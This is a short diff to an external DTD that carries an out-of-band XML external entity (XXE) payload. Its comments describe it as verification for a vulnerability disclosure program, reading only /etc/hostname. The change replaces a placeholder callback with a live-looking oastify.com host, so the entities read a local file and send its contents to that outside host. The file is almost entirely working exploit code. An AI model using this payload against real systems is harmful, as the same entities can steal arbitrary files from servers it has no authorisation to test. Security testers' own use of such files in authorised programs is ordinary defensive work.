@@ -1,6 +1,6 @@
 <!-- OOB XXE verification DTD - United VDP 0c92bb39 - reads /etc/hostname only -->
 <!-- Replace CALLBACK_HOST with a listener you control before hosting this file. -->
 <!ENTITY % file SYSTEM "file:///etc/hostname">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://CALLBACK_HOST/exfil?d=%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://nlc1lz13hvojvhimls17qhsbe2kt8jw8.oastify.com/exfil?d=%file;'>">
 %eval;
 %exfil;
